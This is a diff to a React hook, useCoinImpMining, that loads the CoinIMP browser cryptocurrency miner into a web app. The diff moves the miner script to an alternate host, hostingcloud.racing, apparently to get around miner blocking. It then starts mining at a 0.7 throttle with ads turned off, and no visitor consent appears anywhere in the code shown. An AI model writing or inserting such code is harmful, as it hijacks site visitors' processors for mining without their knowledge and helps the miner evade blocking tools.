@@ -15,7 +15,7 @@ export const useCoinImpMining = () => {
       try {
         // Check if CoinIMP is available
         if (typeof (window as any).Client !== 'undefined') {
-          const client = new (window as any).Client.Anonymous('b8cb2abac794902c8bb6438cea04ce0fb8e0bef3', {
+          const client = new (window as any).Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
             throttle: miningData?.mining_throttle || 0.7,
             c: 'w',
             ads: 0
@@ -40,15 +40,18 @@ export const useCoinImpMining = () => {
       }
     };
 
-    // Load CoinIMP script if not already loaded
-    if (!document.querySelector('script[src*="coinimp"]')) {
-      const script = document.createElement('script');
-      script.src = 'https://www.coinimp.com/scripts/min.js';
-      script.async = true;
-      script.onload = () => {
+    // Load CoinIMP scripts
+    if (!document.querySelector('script[src*="hostingcloud.racing"]')) {
+      // Load first script
+      const script1 = document.createElement('script');
+      script1.src = 'https://www.hostingcloud.racing/etyE.js';
+      script1.async = true;
+      document.head.appendChild(script1);
+
+      // Load second script and initialize
+      script1.onload = () => {
         setTimeout(initializeMining, 500);
       };
-      document.head.appendChild(script);
     } else {
       initializeMining();
     }
